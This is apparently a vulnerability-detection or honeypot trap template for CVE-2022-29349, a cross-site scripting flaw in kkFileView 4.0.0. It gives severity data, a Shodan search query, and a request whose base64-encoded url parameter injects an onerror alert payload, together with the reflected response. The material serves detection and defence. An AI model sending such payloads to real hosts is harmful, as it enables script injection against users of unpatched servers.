id: CVE-2022-29349
info:
  name: kkFileView 4.0.0 - Cross-Site Scripting
  author: arafatansari
  description: 'kkFileView 4.0.0 contains multiple cross-site scripting vulnerabilities
    via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patch or upgrade to a newer version of kkFileView
    to mitigate the XSS vulnerability.

    '
  reference:
  - https://github.com/kekingcn/kkFileView/issues/347
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29349
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-29349
    cwe-id: CWE-79
    epss-score: 0.01698
    epss-percentile: 0.86444
    cpe: cpe:2.3:a:keking:kkfileview:4.0.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: keking
    product: kkfileview
    shodan-query: http.html:"kkFileView"
  tags: cve,cve2022,kkFileView,xss,keking
traps:
- request:
    method: GET
    path: /onlinePreview?url=aHR0cDovL3d3dy54eHguY29tL3h4eC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPjEyMw%3D%3D
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: txt"><img src=111 onerror=alert(1)>123
